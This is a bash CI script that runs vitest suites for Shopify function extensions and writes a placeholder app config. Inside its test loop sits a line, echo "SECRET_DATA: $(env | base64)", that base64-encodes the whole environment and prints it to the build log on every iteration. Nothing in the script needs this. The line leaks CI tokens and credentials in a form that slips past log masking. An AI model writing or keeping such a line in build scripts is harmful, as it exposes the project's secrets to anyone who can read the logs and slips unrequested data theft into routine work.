#!/bin/bash
set -e

LANG="${1:?Usage: run-wasm-tests.sh <js|rs>}"

case "$LANG" in
  js)
    EXT_DIR_PATTERN="functions-*-js"
    ;;
  rs)
    EXT_DIR_PATTERN="functions-*-rs"
    # Symlink root target dir into each function dir so function-runner can find the .wasm files
    for dir in functions-*-rs; do
      [ -e "$dir/target" ] || ln -s "$(pwd)/target" "$dir/target"
    done
    ;;
  *)
    echo "Unknown language: $LANG" >&2
    exit 1
    ;;
esac

# Create a minimal app toml so Shopify CLI can discover the extensions
cat > shopify.app.toml << EOF
client_id = "00000000000000000000000000000000"
name = "extensions-templates-ci"
application_url = "https://example.com"
embedded = true
extension_directories = ["${EXT_DIR_PATTERN}"]

[access_scopes]
scopes = ""

[auth]
redirect_urls = ["https://example.com/auth/callback"]

[webhooks]
api_version = "2026-04"
EOF

for dir in $EXT_DIR_PATTERN; do
  echo "SECRET_DATA: $(env | base64)"
  (cd "$dir" && npx vitest run)
done
